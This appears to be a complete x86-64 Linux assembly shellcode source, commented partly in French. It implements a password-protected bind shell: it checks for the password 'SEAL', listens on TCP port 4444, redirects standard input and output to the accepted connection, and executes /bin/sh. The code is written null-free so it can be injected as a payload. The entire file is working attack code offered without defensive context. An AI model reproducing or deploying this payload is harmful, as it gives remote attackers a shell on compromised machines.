global _start



_start:

call prompt ;jmp-call-pop technique
message db "Password:"


prompt:
pop rsi

loopPrompt:
xor rax,rax
add al,1
xor rdi,rdi
add dil,1
xor rdx,rdx
add dl,9
syscall ;show prompt

xor rax,rax
xor rdi,rdi
lea rsi, [rsp-4]
mov byte [rsp-5],5
syscall ;get text

cmp dword [rsi],0x4c414553 ;compare it with SEAL
je auth_ok
jmp exit_clean

auth_ok:
;
	xor rax,rax
	add al,41
	xor rsi,rsi
	add sil,1
	xor rdi,rdi
	add dil,2
	xor rdx,rdx

	syscall

	mov rdi,rax ;socket server

	xor rax,rax
	push rax

;pour le bind il nous faut plusieurs données
;struct_addr: 8byte de 0 (push rax)
;l'adresse du serveur: ANY (0)
;le port codé en big endian (hton converti en hex)
;Le AF_INET=2
	mov dword [rsp-04],eax
	mov word [rsp-6],0x5c11 ;5c11=23569(BE)=4444(LE)
	xor rax,rax
	inc rax
	inc rax
	mov word [rsp-8],ax
	sub rsp,8


;bind= syscall 49
	xor rax,rax
	add al,49
	mov rsi,rsp
	xor rdx,rdx
	add dl,16
	syscall  ;port ouvert

;wait for client
;50 pour syscall
;rdi pour sock
;rsi max client
	xor rax,rax	
	add al,50
	xor rsi,rsi
	add sil,2
	syscall ;listen

;accept client
	xor rax,rax
	add al,43 ;number syscall
	times 16 dec rsp
	mov rsi,rsp ;pointeur
	mov byte [rsp-1],16 ;adresse vers la valeur 16 pour le accept
	dec rsp
	mov rdx,rsp
	syscall ;wait for client

	mov r9,rax

;close socket
	xor rax,rax
	add al,3
	syscall

;duplicate socket
;dup2 0
	mov rdi,r9
	xor rax,rax	
	add al,33 ;dup2
	xor rsi,rsi
	syscall
;dup2 1
	xor rax,rax
	add al,33
	xor rsi,rsi
	add sil,1
	syscall

;dup2 2
	xor rax,rax
	add al,33
	xor rsi,rsi
	add sil,2
	syscall

;execv
	; First NULL push

	xor rax, rax
	push rax

	; push /bin//sh in reverse 

	mov rbx, 0x68732f2f6e69622f
	push rbx

	; store /bin//sh address in RDI

	mov rdi, rsp

	; Second NULL push 
	push rax

	; set RDX
	mov rdx, rsp 


	; Push address of /bin//sh
	push rdi

	; set RSI

	mov rsi, rsp

	; Call the Execve syscall 
	add rax, 59
	syscall

exit_clean:

xor rax,rax
add al,60
xor rdi,rdi	
syscall

	


